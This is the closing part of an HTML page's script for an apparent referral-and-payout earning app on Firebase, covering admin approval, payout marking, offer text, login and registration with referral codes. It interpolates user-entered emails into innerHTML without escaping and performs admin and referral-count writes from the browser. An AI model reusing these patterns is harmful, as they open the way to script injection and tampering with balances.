                    const w = d.data();
                    h += `<div class="pro-card p-4 flex justify-between items-center">
                        <div class="text-[10px] font-bold">${w.email}<br><span class="text-brand">${w.number}</span></div>
                        <div class="text-right">
                            <p class="font-black text-xs">৳${w.amount}</p>
                            <button onclick="markPaid('${d.id}')" class="bg-dark text-white px-3 py-1 rounded-lg text-[8px] font-bold">PAID</button>
                        </div>
                    </div>`;
                });
                document.getElementById('adm-withdraws').innerHTML = h || '<p class="text-center opacity-30 text-[10px]">NO PENDING PAYOUTS</p>';
            });
        };

        window.approveID = async (id) => {
            const { value: rate } = await Swal.fire({ title: 'Daily Rate (৳)', input: 'number' });
            if(rate) {
                await updateDoc(doc(db, "accounts", id), { status: 'approved', daily_rate: Number(rate) });
                Swal.fire('Approved!', '', 'success');
            }
        };
        window.markPaid = async (id) => {
            await updateDoc(doc(db, "withdrawals", id), { status: 'paid' });
            Swal.fire('Marked as Paid!', '', 'success');
        };
        window.updateOffer = async () => {
            const { value: msg } = await Swal.fire({ title: 'Set Offer Text', input: 'text' });
            if(msg) {
                await setDoc(doc(db, "settings", "global"), { offer_text: msg, is_offer_active: true });
                Swal.fire('Updated!', '', 'success');
            }
        };

        // AUTH SYSTEM
        document.getElementById('btnLogin').onclick = () => signInWithEmailAndPassword(auth, document.getElementById('l-email').value, document.getElementById('l-pass').value).catch(e => Swal.fire('Error', 'Invalid Details', 'error'));
        document.getElementById('btnRegister').onclick = async () => {
            const e = document.getElementById('r-email').value;
            const p = document.getElementById('r-pass').value;
            const ref = document.getElementById('r-ref').value;
            try {
                const res = await createUserWithEmailAndPassword(auth, e, p);
                const code = Math.random().toString(36).substring(2, 8).toUpperCase();
                await setDoc(doc(db, "users", res.user.uid), {
                    uid: res.user.uid, email: e, balance: 0, total_earn: 0, today_earn: 0, refer_earn: 0, xp: 0, streak: 0,
                    refer_code: code, referred_by: ref || null, refer_count: 0
                });
                if(ref) {
                    const q = query(collection(db, "users"), where("refer_code", "==", ref));
                    const snap = await getDocs(q);
                    if(!snap.empty) await updateDoc(doc(db, "users", snap.docs[0].id), { refer_count: increment(1) });
                }
            } catch (err) { Swal.fire('Error', err.message, 'error'); }
        };

    </script>
</body>

</html>
